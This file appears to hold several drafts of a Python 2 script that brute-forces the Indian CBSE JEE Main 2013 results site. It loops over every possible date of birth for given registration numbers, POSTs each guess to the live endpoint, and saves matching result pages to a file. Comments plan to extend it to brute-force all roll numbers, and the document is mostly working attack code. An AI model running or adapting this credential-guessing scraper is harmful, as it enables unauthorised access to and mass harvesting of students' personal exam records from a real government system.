﻿﻿# bfr final script
# jee main roll chk
﻿import httplib2
from urllib import urlencode
from bs4 import BeautifulSoup
file = 'testfile.txt'
h=httplib2.Http(cache=None)
url="http://cbseresults.nic.in/jee/jee13_cbse.asp"
headers={'Connection': 'keep-alive','Origin': 'http://cbseresults.nic.in','Referer': 'http://cbseresults.nic.in/jee/jee_cbse_2013.htm','Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'}
day={'01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31'}
month={'01','02','03','04','05','06','07','08','09','10','11','12'}
year={'1992','1993','1994','1995','1996'}
loopsDone = False
for cyear in year:
	if loopsDone:
		break
	for cmonth in month:
		if loopsDone:
			break
		for cday in day:
			data={'regno':'82912021','dob':cday+'/'+cmonth+'/'+cyear,'b2':'Submit'}
			response, content = h.request(url,'POST',urlencode(data),headers)
			print data
			if(len(content)>4500):
				soup = BeautifulSoup(content)
				with open(file,mode='a') as a_file:
					for string in soup.stripped_strings:
						a_file.write(repr(string))
					a_file.write("\n")
				loopsDone = True
				print response
				print content.decode('utf-8')
				break
#jeemainarchive.py
import httplib2
from urllib import urlencode
h=httplib2.Http('.cache')
url="http://cbseresults.nic.in/jee/jee13_cbse.asp"
day={'01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31'}
month={'01','02','03','04','05','06','07','08','09','10','11','12'}
year={'1994'}
data={'regno':'82606019','dob':day+'/'+month+'/'+year,'b2':'Submit'}
#data="regno=82606019&dob=19%2F04%2F1994&B2=Submit"
response, content = h.request(url,'POST',urlencode(data),headers={'Connection': 'keep-alive','Origin': 'http://cbseresults.nic.in','Referer': 'http://cbseresults.nic.in/jee/jee_cbse_2013.htm','Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'})
print response
print content.decode('utf-8')
f = open('testdatahtml2.txt','w')
f.write(content)
   
# this file all dump of jeemain.py
# advanced-1
﻿import httplib2
from urllib import urlencode
file = 'testfile.txt'
h=httplib2.Http(cache=None)
url="http://cbseresults.nic.in/jee/jee13_cbse.asp"
headers={'Connection': 'keep-alive','Origin': 'http://cbseresults.nic.in','Referer': 'http://cbseresults.nic.in/jee/jee_cbse_2013.htm','Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'}
day={'01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31'}
month={'01','02','03','04','05','06','07','08','09','10','11','12'}
year={'1994'}
for cyear in year:
	for cmonth in month:
		for cday in day:
			data={'regno':'82606019','dob':cday+'/'+cmonth+'/'+cyear,'b2':'Submit'}
			print urlencode(data)
			response, content = h.request(url,'POST',urlencode(data),headers)
			if(len(content)>4500):
				print response
				print content.decode('utf-8')
				
#have to add loop or text file for reg no
#have to break the loop after correct record has been received
#reverse the program so that at a particular dob all rem roll nos are brute-forced #
# code before going advanced
# this is the basic framework
import httplib2
from urllib import urlencode
h=httplib2.Http('.cache')
url="http://cbseresults.nic.in/jee/jee13_cbse.asp"
headers={'Connection': 'keep-alive','Origin': 'http://cbseresults.nic.in','Referer': 'http://cbseresults.nic.in/jee/jee_cbse_2013.htm','Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'}
day={'01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31'}
month={'01','02','03','04','05','06','07','08','09','10','11','12'}
year={'1994'}
for cyear in year:
	for cmonth in month:
		for cday in day:
			data={'regno':'82606019','dob':cday+'/'+cmonth+'/'+cyear,'b2':'Submit'}
			print urlencode(data)
			response, content = h.request(url,'POST',urlencode(data),headers)
			if(len(content)>4500):
				print response
				print content.decode('utf-8')
				
#have to add loop or text file for reg no
#have to break the loop after correct record has been received
#reverse the program so that at a particular dob all rem roll nos are brute-forced 
